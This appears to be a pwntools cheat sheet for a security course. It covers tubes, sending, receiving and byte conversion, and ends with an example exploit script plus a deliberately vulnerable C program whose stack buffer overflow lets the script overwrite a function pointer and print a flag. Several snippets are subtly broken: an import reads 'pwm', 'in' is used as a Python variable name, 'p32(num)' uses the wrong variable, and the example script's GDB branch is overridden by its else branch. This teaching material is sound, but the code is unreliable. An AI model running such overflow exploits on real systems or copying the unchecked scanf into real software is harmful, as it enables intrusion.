Setup

    python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools

    Then at the start of your python script:

    from pwm import *

Tubes

Tubes are the way we interact with programs. The first thing you usually do in some pwntools code is usually opening your tube

    To communicate with a local binary

    r = process('./your_binary')

    To communicate with a remote host

    r = remote('cysec2.attacking.systems',1337)

    Start a local binary with gdb

    r = gdb.debug('./your_binary')

    If you want to use pwndbg instead of normal gdb do:

    context.gdb_binary = 'pwndbg'

    If no gdb window opens for you, you might need to instead do:

    # replace kitty with whatever terminal you are using
context.terminal = 'kitty'
r = gdb.debug('./your_binary')

    If you are on the webshell, you need to do:

    context.terminal = ['tmux', 'splitw', '-h']
r = gdb.debug('./your_binary')

    And then run the code with:

    tmux
python yourcode.py

Receiving

Once you have opened a tube, you can receive from it with these methods. All of these return data in bytes, see the conversion section on how to work with this

    Receive up to n bytes.

    in = r.recv(n)

    Receive exactly n bytes.

    in = r.recvn(n)

    Receive up to and including a newline.

    in = r.recvline()

    Receive up to and including the string prompt.

    in = r.recvuntil(prompt)

    Receive up to and including something that matches regex.

    in = r.recvregex(regex)

    Receive everything until the connection closes.

    in = r.recvall()

    Receive everything that comes within 0.1 seconds 

    in = r.recvall(timeout=0.1)

Sending

Once you have opened a tube, you can send to it with these methods. All of expect data in bytes, see the conversion section on how to work with this

    Send out into the tube r

    r.send(out)

    Send out + '\n' into the tube r

    r.sendline(out)

    Send out + '\n' as soon as prompt gets received

    r.sendlineafter(prompt, out)

    Drop into interactive mode. Sends everything you enter into the tube and sends everything it receives back. Use it once you have a shell

    r.interactive()

Conversion

Convert between strings, bytes, and integers using these methods.

To change whether it should be little or big endian:

context.endian = 'little' # or replace with big

    String to Bytes

    text = "hello"
bytes_data = text.encode()  # b'hello'
bytes_data = text.encode('utf-8')  # explicit encoding

    Bytes to String

    bytes_data = b"hello"
text = bytes_data.decode()  # "hello"
text = bytes_data.decode('utf-8')  # explicit decoding

    Bytes to Integer

    data = b"\x34\x12\x00\x00"
num = u32(data)  # unpack 4 bytes to 32-bit int
num = u64(data)  # unpack 8 bytes to 64-bit int

    Integer to Bytes

    addr = 0x1234
addr = p32(num)  # pack to 4 bytes
addr = p64(num)  # pack to 8 bytes

Example script

Python code to exploit vuln.c

from pwn import *

# uses pwndbg instead of normal gdb
context.gdb_binary = 'pwndbg'

# only needed if you are using non-default endianness
context.endian = 'little'

# args allows you to pass command line arguments to your script
# if started with python3 script.py GDB, debug
if args.GDB:
    r = gdb.debug('./vuln', exe='./vuln')
# if started with python3 script.py REMOTE, send data to remote
if args.REMOTE:
    r = remote('not-a-real-remote.attacking.systems', 1337)
# otherwise start normally
else:
    r = process('./vuln')

# receive the first line
line = r.recvline().decode('utf-8')

# line[:-1] to remove the newline character at the end to remove the newline character at the end
print(f'Received: "{line[:-1]}", extracting address...')

# get the 5th word and get rid of 0x
hex_str = line.split()[4][2:]
# convert it to an integer
addr = int(hex_str, 16)

print(f'Found addr at {hex(addr)}')

# build the payload
payload = b'A'*512 # fill the buffer
payload += p64(addr) # overwrite into functionToCall

print(f'Sending payload...')
r.sendline(payload)
r.recvline()

print(f'Flag: {r.recvline().decode()}')

vuln.c

#include 

void normal() {
  printf("No!\n");
}

void printflag(){
  printf("CYSEC2{YOU_DID_IT}\n");
}

// type for a function pointer
typedef void func(void);

struct mystruct {
  // this data is stored right next to each other
  char buffer[512];
  func* functionToCall; // we want to overwrite this to call printflag instead
};

void main() {
  struct mystruct data;
  data.functionToCall = normal;
  printf("The flag is at %p btw\n", &printflag);

  printf("Say something: ");

  // stack buffer overflow here
  scanf("%s", data.buffer);

  printf("cool\n");

  // calls the function at address functionToCall
  ((func *)data.functionToCall)();
}
